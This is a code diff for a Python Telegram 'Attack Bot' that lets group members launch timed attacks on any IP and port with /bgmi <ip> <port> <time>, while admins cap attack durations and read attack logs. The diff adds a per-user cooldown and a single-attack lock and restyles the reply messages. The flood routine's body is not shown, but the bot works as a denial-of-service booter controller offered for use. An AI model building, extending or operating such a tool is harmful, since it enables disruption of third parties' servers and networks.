@@ -4,10 +4,11 @@ import asyncio
 import itertools
 import requests
 import os
-from telegram import Update
 import time
+from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS
+
 
 
 
@@ -43,6 +44,8 @@ MAX_DURATION = 240  # Default max attack duration in seconds
 user_durations = {}  # Dictionary to store max durations for specific users
 # Global variable to store user attack counts
 user_attack_counts = {}
+# Global variable to store user cooldowns
+user_cooldowns = {}
 
 
 
@@ -55,7 +58,7 @@ ATTACKS_FILE = "attacks.txt"
 # Ensure commands are executed in the correct group
 async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     if update.effective_chat.id != GROUP_ID:
-        await update.message.reply_text(f"❌ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝗮 𝘀𝗽𝗲𝗰𝗶𝗳𝗶𝗰 𝗴𝗿𝗼𝘂𝗽. 𝗝𝗼𝗶𝗻 𝗵𝗲𝗿𝗲:- {GROUP_LINK}")
+        await update.message.reply_text(f"❌ 𝐭𝐡𝐢ꜱ 𝐛𝐨𝐭 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮ꜱ𝐞𝐝 𝐢𝐧 𝐚 ꜱ𝐩𝐞𝐜𝐢𝐟𝐢𝐜 𝐠𝐫𝐨𝐮𝐩. 𝐣𝐨𝐢𝐧 𝐡𝐞𝐫𝐞:- {GROUP_LINK}")
         return False
     return True
 
@@ -138,7 +141,7 @@ async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = update.message.from_user.id
     if user_id not in map(int, ADMIN_IDS):
-        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨ꜱ𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
         return
 
     # Load attack data
@@ -162,18 +165,18 @@ async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 break
 
         report_lines.append(
-            f"𝐔𝐈𝐃:-   {uid}, \n𝐍𝐚𝐦𝐞:-   {display_name}, \n𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:-   @{username}, \n𝐀𝐭𝐭𝐚𝐜𝐤𝐬:-   {count}\n **************************"
+            f"𝗨𝗜𝗗:-   {uid}, \n𝗡𝗔𝗠𝗘​:-   {display_name}, \n𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘​:-   @{username}, \n𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:-   {count}\n **************************"
         )
         grand_total += count
 
     # Add grand total
-    report_lines.append(f"\n👥 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:- {grand_total}")
+    report_lines.append(f"\n👥 ​𝗧𝗢𝗧𝗔𝗟 𝗔𝗧𝗧𝗔𝗖𝗞𝗦​:- {grand_total}")
 
     # Send report
     if report_lines:
         await update.message.reply_text("\n".join(report_lines))
     else:
-        await update.message.reply_text("⚠️ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗮𝘁𝗮 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")
+        await update.message.reply_text("⚠️ 𝐧𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐚𝐭𝐚 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
 
 
 async def start_attack(target_ip, port, duration, user_id, original_message, context):
@@ -198,7 +201,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
         active_attack = False  # Reset the flag after the attack finishes
 
         try:
-            await original_message.reply_text(f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗼𝗻 {target_ip}:{port} 𝗳𝗼𝗿 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
+            await original_message.reply_text(f"✅ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐟𝐢𝐧𝐢𝐬𝐡𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬.")
         except Exception:
             pass  # Silently ignore all errors when sending the reply
 
@@ -212,7 +215,7 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
         try:
             await context.bot.send_message(
                 chat_id=GROUP_ID,  # Send the message to the group
-                text=f"⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗮𝘀 𝗶𝘁 𝗲𝘅𝗰𝗲𝗲𝗱𝗲𝗱 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗼𝗻 {target_ip}:{port}."
+                text=f"⚠️ 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝 𝐚ꜱ 𝐢𝐭 𝐞𝐱𝐜𝐞𝐞𝐝𝐞𝐝 𝐭𝐡𝐞 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐨𝐧 {target_ip}:{port}."
             )
         except Exception:
             pass
@@ -226,9 +229,10 @@ async def start_attack(target_ip, port, duration, user_id, original_message, con
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not await ensure_correct_group(update, context):
         return
-    await update.message.reply_text("👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝗼𝘁!\n𝗨𝘀𝗲 /𝗯𝗴𝗺𝗶 <𝗜𝗣> <𝗣𝗢𝗥𝗧> <𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡> 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸.")
+    await update.message.reply_text("👋 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐛𝐨𝐭!\n 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤")
 
 # BGMI command handler
+# BGMI command handler with single attack restriction
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global active_attack
     if not await ensure_correct_group(update, context):
@@ -240,12 +244,26 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     await save_user_info(user_id, username)
 
+    current_time = time.time()
+    cooldown_time = 600  # Cooldown period in seconds (10 minutes)
+
+    # Check if an attack is already in progress
     if active_attack:
-        await update.message.reply_text("🚫 𝗥𝘂𝗸 𝗝𝗮𝗮 𝗕𝗵𝗼𝘀𝗱𝗶𝗸𝗲....")
+        await update.message.reply_text(
+            "🚫 ​𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬. 𝐩𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚 𝐧𝐞𝐰 𝐨𝐧𝐞."
+        )
         return
 
+    # Check if the user is on cooldown
+    if user_id in user_cooldowns:
+        time_since_last_attack = current_time - user_cooldowns[user_id]
+        if time_since_last_attack < cooldown_time:
+            remaining_time = int(cooldown_time - time_since_last_attack)
+            await update.message.reply_text(f"⏳ 𝐲𝐨𝐮 𝐦𝐮𝐬𝐭 𝐰𝐚𝐢𝐭​ {remaining_time} ​𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐛𝐞𝐟𝐨𝐫𝐞 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐚𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤​.")
+            return
+
     if len(context.args) != 3:
-        await update.message.reply_text("🛡️ 𝗨𝘀𝗮𝗴𝗲: /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
+        await update.message.reply_text("🛡️ 𝐮𝐬𝐞 /𝐛𝐠𝐦𝐢 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐭𝐢𝐦𝐞> 𝐭𝐨 𝐬𝐭𝐚𝐫𝐭 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤​")
         return
 
     target_ip = context.args[0]
@@ -253,20 +271,33 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         port = int(context.args[1])
         duration = int(context.args[2])
     except ValueError:
-        await update.message.reply_text("⚠️ 𝗣𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿𝘀.")
+        await update.message.reply_text("⚠️ 𝐩𝐨𝐫𝐭 𝐚𝐧𝐝 𝐭𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐢𝐧𝐭𝐞𝐠𝐞𝐫𝐬​.")
         return
 
     max_duration = user_durations.get(user_id, MAX_DURATION)
     if duration > max_duration:
-        await update.message.reply_text(f"⚠️ 𝗬𝗼𝘂𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝘀 {max_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗮𝘀 𝘀𝗲𝘁 𝗯𝘆 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻.")
+        await update.message.reply_text(f"⚠️ ​𝐲𝐨𝐮𝐫 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐭𝐢𝐦𝐞 𝐢𝐬​ {max_duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐚𝐭 𝐬𝐞𝐭 𝐛𝐲 𝐭𝐡𝐞 𝐚𝐝𝐦𝐢𝐧​.")
         duration = max_duration
 
+    # Log the attack, update cooldown, and mark the attack as active
+    user_cooldowns[user_id] = current_time  # Set cooldown for the user
+    active_attack = True  # Mark the attack as active
     await save_attack_log(user_id, target_ip, port, duration)
 
-    attack_message = await update.message.reply_text(f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 𝗼𝗻 {target_ip}:{port} 𝗳𝗼𝗿 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘄𝗶𝘁𝗵 {DEFAULT_THREADS} 𝘁𝗵𝗿𝗲𝗮𝗱𝘀.")
-
-    active_attack = True
+    # Notify users and start the attack
+    attack_message = await update.message.reply_text(
+        f"🚀 ​𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐨𝐧​ {target_ip}:{port} 𝐟𝐨𝐫 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐰𝐢𝐭𝐡​ {DEFAULT_THREADS} 𝐭𝐡𝐫𝐞𝐚𝐝𝐬."
+    )
     asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))
+
+    # Reset active_attack once the attack finishes
+    async def reset_attack_status():
+        global active_attack
+        await asyncio.sleep(duration)
+        active_attack = False
+
+    asyncio.create_task(reset_attack_status())
+
 
 # Set max duration command (Admin-only)
 async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -275,11 +306,11 @@ async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
 
     user_id = update.message.from_user.id
     if user_id not in map(int, ADMIN_IDS):
-        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
         return
 
     if len(context.args) != 2:
-        await update.message.reply_text("🛡️ 𝗨𝘀𝗮𝗴𝗲: /𝘀𝗲𝘁 <𝘂𝗶𝗱/𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
+        await update.message.reply_text("🛡️ 𝐮ꜱ𝐚𝐠𝐞: /𝐬𝐞𝐭 <𝐮𝐢𝐝/𝐮𝐬𝐞𝐫𝐧𝐚𝐦𝐞> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>")
         return
 
     try:
@@ -296,12 +327,12 @@ async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
                     user_found = True
                     break
             if not user_found:
-                await update.message.reply_text("⚠️ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
+                await update.message.reply_text("⚠️ 𝐮ꜱ𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")
                 return
 
-        await update.message.reply_text(f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝘀𝗲𝘁 𝘁𝗼 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗳𝗼𝗿 {target}.")
+        await update.message.reply_text(f"✅ 𝐦𝐚𝐱 𝐚𝐭𝐭𝐚𝐜𝐤 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐬𝐞𝐭 𝐭𝐨 {duration} 𝐬𝐞𝐜𝐨𝐧𝐝ꜱ 𝐟𝐨𝐫 {target}.")
     except ValueError:
-        await update.message.reply_text("⚠️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝗻 𝗶𝗻𝘁𝗲𝗴𝗲𝗿.")
+        await update.message.reply_text("⚠️ 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐧 𝐢𝐧𝐭𝐞𝐠𝐞𝐫.")
 
 # View logs command (Admin-only)
 async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -310,7 +341,7 @@ async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = update.message.from_user.id
     if user_id not in map(int, ADMIN_IDS):
-        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
         return
 
     try:
@@ -318,7 +349,7 @@ async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             logs = f.read()
         await update.message.reply_text(f"📊 Attack logs:\n{logs}")
     except Exception as e:
-        await update.message.reply_text("⚠️ 𝗡𝗼 𝗹𝗼𝗴𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")
+        await update.message.reply_text("⚠️ 𝐧𝐨 𝐥𝐨𝐠𝐬 𝐚𝐯𝐢𝐥𝐚𝐛𝐞.")
 
 # View users command (Admin-only)
 async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -327,7 +358,7 @@ async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     user_id = update.message.from_user.id
     if user_id not in map(int, ADMIN_IDS):
-        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
+        await update.message.reply_text("❌ 𝐛𝐚𝐝𝐦𝐨𝐬𝐢 𝐧𝐚𝐡𝐢 𝐦𝐢𝐭𝐭𝐚𝐫..!!!")
         return
 
     try:
@@ -335,7 +366,7 @@ async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             users = f.read()
         await update.message.reply_text(f"👥 Users:\n{users}")
     except Exception as e:
-        await update.message.reply_text("⚠️ 𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")
+        await update.message.reply_text("⚠️ 𝐧𝐨 𝐮𝐬𝐞𝐫𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞.")
 
 # Main application setup
 if __name__ == '__main__':
